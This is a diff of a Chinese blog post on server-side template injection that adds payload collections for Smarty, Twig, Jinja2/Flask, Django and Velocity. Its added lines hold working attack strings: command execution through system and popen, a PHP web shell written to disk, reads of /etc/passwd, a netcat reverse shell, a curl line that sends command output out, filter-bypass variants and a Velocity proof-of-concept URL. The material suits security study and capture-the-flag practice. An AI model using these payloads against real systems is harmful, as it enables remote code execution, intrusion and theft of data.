@@ -142,7 +142,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意：面向对象的语言中，获取父类这种思想要贯穿始终，</span><br><span class="line">理论基础：</span><br><span class="line">    Python 的魔法方法</span><br><span class="line">    PHP 的自省</span><br><span class="line">    JAVA 的反射机制</span><br></pre></td></tr></table></figure>
 
 <h3 id="利用模板本身的特性进行攻击"><a href="#利用模板本身的特性进行攻击" class="headerlink" title="利用模板本身的特性进行攻击"></a>利用模板本身的特性进行攻击</h3><p>1.Smarty</p>
-<p>这个模版不能执行PHP中直接进行命令的函数，但是对于语言的限制并不能够影响我们执行命令。(因为没有阅读文档，所以直接从大佬文章中摘抄)。<code>$</code>+内置变量可以访问各种环境变量，比如其中self得到smarty这个类，我们就可以开始去找文档中的好方法了</p>
+<p>这个模版不能执行PHP中直接进行命令的函数，但是对于语言的限制并不能够影响我们执行命令。(因为没有阅读文档，所以直接从大佬文章中摘抄)。<code>$</code>+内置变量可以访问各种环境变量，比如其中<strong>self得到smarty这个类</strong>，<strong>但是这个方法在3.x版本已经废弃，删掉了静态方法</strong>我们就可以开始去找文档中的好方法了</p>
 <p><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></p>
 <p>这个函数可以读文件</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	&#123;self::getStreamVariable(&quot;flag.php&quot;)&#125;</span><br></pre></td></tr></table></figure>
@@ -157,6 +157,9 @@
 <p>payload:</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
 
+<p>常用的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #执行相应的php代码##在最新版已经废弃</span><br><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;  #全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&amp;&amp;，and，is_array()等等，如：&#123;if is_array($array)&#125;&#123;&#x2F;if&#125;*，也可以执行php代码</span><br></pre></td></tr></table></figure>
+
 <p>2.Twig</p>
 <p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了。但是可以查阅<a href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a></p>
 <p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env。env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php</p>
@@ -169,6 +172,27 @@
 <p> <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p>
 <p>我们只要把exec() 作为回调函数传进去就能实现命令执行了.</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>版本3.x的payload,围绕几个fliter</p>
+<ul>
+<li>map</li>
+</ul>
+<p><code>&#123;&#123;["id"]|map("system")|join(",")`
+
+`&#123;&#123;&#123;"<?php phpinfo();":"/var/www/html/shell.php"&#125;|map("file_put_contents")&#125;&#125;</code></code></p>
+<ul>
+<li>sort</li>
+</ul>
+<p><code>&#123;&#123;["id", 0]|sort("system")|join(",")&#125;&#125;</code></p>
+<ul>
+<li><p>filter</p>
+<p><code>&#123;&#123;["id"]|filter("system")|join(",")&#125;&#125;</code></p>
+</li>
+<li><p>reduce</p>
+<p><code>&#123;&#123;[0, 0]|reduce("system", "id")|join(",")&#125;&#125;</code></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#x2F;etc&#x2F;passwd&#39;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#39;&#x2F;etc&#x2F;passwd&#39;,&#39;&#39;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#39;cat &#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>3.freeMarker</p>
 <p>java模板</p>
@@ -196,13 +220,49 @@
 <p>到时候我们就能通过 config[‘SHELL’] 调用 system 方法了</p>
 <p>那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过,大佬的一篇博文[python 沙盒逃逸备忘](<a href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)</p>
 <p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;加载system</span><br><span class="line">&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令反弹SHELL</span><br></pre></td></tr></table></figure>
+<h3 id="1-python2"><a href="#1-python2" class="headerlink" title="1.python2"></a>1.python2</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;加载system</span><br><span class="line">&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令反弹SHELL</span><br></pre></td></tr></table></figure>
+
+<p>使用file类读取文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span>(c.__name__==<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        print(c)</span><br><span class="line">        <span class="keyword">print</span> c(<span class="string">&#x27;joker.txt&#x27;</span>).readlines()</span><br><span class="line">封装一下：</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;file&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c(<span class="string">&quot;/etc/passwd&quot;</span>).readlines() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用内置模块进行命令执行</p>
+<p><code>__globals__</code>查看内置的对象可以调用的方法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():<span class="comment">#对存放该函数中全局变量的字典的引用 — 函数所属模块的全局命名空间。故可以直接调用</span></span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br></pre></td></tr></table></figure>
+
+<p>这时候就要推<code>荐__builtins__</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(i.__init__.__globals__.keys())</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>python3:().<code>__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p>
+<p>python2:<code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p>
+<p>附上大佬的payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得基类</span><br><span class="line">#python2.7</span><br><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line">#python3.7</span><br><span class="line">&#39;&#39;.__。。。class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line">#python 2.7</span><br><span class="line">#文件操作</span><br><span class="line">#找到file类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">#读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;tmp&#39;).write(&#39;test&#39;)</span><br><span class="line"></span><br><span class="line">#命令执行</span><br><span class="line">#os执行</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</span><br><span class="line">#eval,impoer等全局函数</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line"></span><br><span class="line">#python3.7</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#文件操作</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#windows下的os命令</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>绕waf</strong></p>
+<p>过滤【</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#getitem、pop</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>过滤引号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#chr函数</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure>
+
+<p>过滤下划线</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure>
+
+<p>过滤花括号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用&#123;%%&#125;标记</span><br><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;127.0.0.1:7999&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用示例</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;         &#x2F;&#x2F;popen的参数就是要执行的命令</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
 <p>3.Tornado</p>
 <p>我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 <code>需要的值</code>我特地看一下模板的对框架的语法支持(因为，<code>模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字</code>，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest )</p>
 <p>护网杯的easytornado，全局搜索sercet-key，然后再查看官方文档</p>
-<h4 id="2-利用模语言本身的特性进行攻击《转载》"><a href="#2-利用模语言本身的特性进行攻击《转载》" class="headerlink" title="2.利用模语言本身的特性进行攻击《转载》"></a><strong>2.利用模语言本身的特性进行攻击</strong>《转载》</h4><h5 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a><strong>1.Python</strong></h5><p>Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在大佬的[一篇博文](<a href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)中</p>
-<h5 id="2-JAVA"><a href="#2-JAVA" class="headerlink" title="2.JAVA"></a><strong>2.JAVA</strong></h5><p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类</p>
+<p>4.Django</p>
+<p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在<strong>没有应用源码的情况下去寻找框架本身的属性</strong>，看这个空框架有什么属性和类之间的引用。</p>
+<p>后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911002243408-1781833415.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911002243408-1781833415.png" alt="img"></a></p>
+<p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
+<h4 id="2-利用模语言本身的特性进行攻击"><a href="#2-利用模语言本身的特性进行攻击" class="headerlink" title="2.利用模语言本身的特性进行攻击"></a><strong>2.利用模语言本身的特性进行攻击</strong></h4><h5 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a><strong>1.Python</strong></h5><p>Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在大佬的[一篇博文](<a href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)中</p>
+<h5 id="2-JAVA《转载大佬的部分》"><a href="#2-JAVA《转载大佬的部分》" class="headerlink" title="2.JAVA《转载大佬的部分》"></a><strong>2.JAVA</strong>《转载大佬的部分》</h5><p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的</p>
 <p><strong>如下图所示：</strong></p>
 <p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
 <p>有了这个基础我们就能想到这样的payload</p>
@@ -210,6 +270,118 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;cat etc/passwd&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p>
+<h2 id="java常见的引擎：FreeMarker，-velocity"><a href="#java常见的引擎：FreeMarker，-velocity" class="headerlink" title="java常见的引擎：FreeMarker， velocity"></a>java常见的引擎：FreeMarker， velocity</h2><h3 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h3><p>（以下板块参照自《<a href="https://xz.aliyun.com/t/8135#toc-2">CVE-2019-3396 Confluence Velocity SSTI漏洞浅析</a>》）</p>
+<p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p>
+<p><strong>基本语法</strong></p>
+<p><strong>语句标识符</strong></p>
+<p>#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p>
+<p><strong>变量</strong></p>
+<p>$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a</p>
+<p><strong>声明</strong></p>
+<p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set($a &#x3D;&quot;velocity&quot;)</span><br><span class="line">#set($b&#x3D;1)</span><br><span class="line">#set($arrayName&#x3D;[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure>
+
+<p><strong>注释</strong></p>
+<p>单行注释为##，多行注释为成对出现的#* …………. *#</p>
+<p><strong>条件语句</strong></p>
+<p>以if/else为例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($foo&#x3D;&#x3D;10)</span><br><span class="line">    &lt;strong&gt;2&lt;&#x2F;strong&gt;</span><br><span class="line">#elseif($bar&#x3D;&#x3D;6)</span><br><span class="line">    &lt;strong&gt;3&lt;&#x2F;strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;&#x2F;strong&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+
+<p><strong>转义字符</strong></p>
+<p>如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$</p>
+<p><strong>基础使用</strong></p>
+<p>使用Velocity主要流程为：</p>
+<ul>
+<li>初始化Velocity模板引擎，包括模板路径、加载类型等</li>
+<li>创建用于存储预传递到模板文件的数据的上下文</li>
+<li>选择具体的模板文件，传递数据完成渲染</li>
+</ul>
+<p>VelocityTest.java</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package Velocity;</span><br><span class="line"></span><br><span class="line">import org.apache.velocity.Template;</span><br><span class="line">import org.apache.velocity.VelocityContext;</span><br><span class="line">import org.apache.velocity.app.VelocityEngine;</span><br><span class="line"></span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">public class VelocityTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        VelocityEngine velocityEngine &#x3D; new VelocityEngine();</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, &quot;file&quot;);</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, &quot;src&#x2F;main&#x2F;resources&quot;);</span><br><span class="line">        velocityEngine.init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line">        context.put(&quot;name&quot;, &quot;Rai4over&quot;);</span><br><span class="line">        context.put(&quot;project&quot;, &quot;Velocity&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Template template &#x3D; velocityEngine.getTemplate(&quot;test.vm&quot;);</span><br><span class="line">        StringWriter sw &#x3D; new StringWriter();</span><br><span class="line">        template.merge(context, sw);</span><br><span class="line">        System.out.println(&quot;final output:&quot; + sw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>模板文件：src/main/resources/test.vm</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is $name.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">final output:</span><br><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is Victor Zhang.</span><br><span class="line">Project is Velocity</span><br><span class="line">java.lang.UNIXProcess@12f40c25</span><br></pre></td></tr></table></figure>
+
+<p>通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。</p>
+<p>通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。</p>
+<p>通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907173719066-1030164230.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907173719066-1030164230.png" alt="img"></a></p>
+<p>这里使用java-sec-code里面的SSTI代码：</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907191011269-128540012.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907191011269-128540012.png" alt="img"></a></p>
+<p>poc：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;ssti&#x2F;velocity?template&#x3D;%23set(%24e&#x3D;%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor() &#x2F;&#x2F;延迟了5秒</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907192034956-1485346370.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200907192034956-1485346370.png" alt="img"></a></p>
+<p>参照《<a href="https://xz.aliyun.com/t/7466">白头搔更短，SSTI惹人心！</a>》简单进行调试</p>
+<p>在最初的Controller层下断点，来追踪poc的解析过程：</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908095030110-571936567.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908095030110-571936567.png" alt="img"></a></p>
+<p>（template -&gt; instring）进入 Velocity.evaluate 方法：</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112550988-1581803954.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112550988-1581803954.png" alt="img"></a></p>
+<p>（instring -&gt; reader）继续跟进 evaluate 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</p>
